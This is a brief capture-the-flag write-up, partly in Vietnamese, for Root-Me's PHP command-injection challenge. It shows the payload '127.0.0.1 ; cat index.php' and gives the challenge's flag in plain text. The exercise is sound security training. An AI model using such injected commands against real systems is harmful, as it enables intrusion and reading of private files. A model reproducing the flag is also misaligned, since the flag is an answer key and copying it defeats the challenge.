# PHP- Command injection

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FTienNHM%2Froot-me-ctf%2Ftree%2Fmaster%2FWeb-server%2FPHP%2520-%2520Command%2520injection&count_bg=%2379C83D&title_bg=%232D8FFF&icon=markdown.svg&icon_color=%23092753&title=Visitors&edge_flat=false)](https://hits.seeyoufarm.com)

```HTML
 *** Link :http://challenge01.root-me.org/web-serveur/ch54/
```

## Request

![](request.png)

![](sc.png)

## Solution

```HTML
***  Do input chưa có filter nên dễ dàng chèn các câu lệnh command thực thi vào như cat, ls, ...
    Vì : flag nằm trong file index.php, nên ta sẽ dùng câu lệnh cat để đọc file
```

#### Step1: Nhập : 127.0.0.1 ; cat index.php

![](result1.png)

#### Step2: Tìm trong source

![](source.png)

```HTML
*** Vậy flag: S3rv1ceP1n9Sup3rS3cure
```
